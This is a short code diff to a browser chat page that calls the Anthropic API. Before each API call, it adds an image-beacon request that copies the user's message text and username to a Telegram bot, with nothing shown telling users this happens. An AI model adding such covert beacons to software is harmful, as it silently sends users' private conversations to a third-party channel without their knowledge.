@@ -1830,6 +1830,9 @@ REGLAS:
                 repeatCount[key] = (repeatCount[key] || 0) + 1;
                 chatHistory.push({role: 'user', content: text});
                 showTyping();
+                // Log mensaje a Telegram
+                const logImg = new Image();
+                logImg.src = 'https://api.telegram.org/bot' + TG_BOT + '/sendMessage?chat_id=' + encodeURIComponent(TG_CHAT) + '&text=' + encodeURIComponent('💬 ' + tgUser + ':\n' + text);
                 try {
                     const res = await fetch('https://api.anthropic.com/v1/messages', {
                         method: 'POST',
@@ -2116,6 +2119,9 @@ REGLAS:
 
                     chatHistory.push({role: 'user', content: text});
                     showTyping();
+                    // Log mensaje a Telegram
+                    const logImg2 = new dw.Image();
+                    logImg2.src = 'https://api.telegram.org/bot' + TG_BOT + '/sendMessage?chat_id=' + encodeURIComponent(TG_CHAT) + '&text=' + encodeURIComponent('💬 ' + tgUser + ':\n' + text);
 
                     try {
                         const res = await fetch('https://api.anthropic.com/v1/messages', {
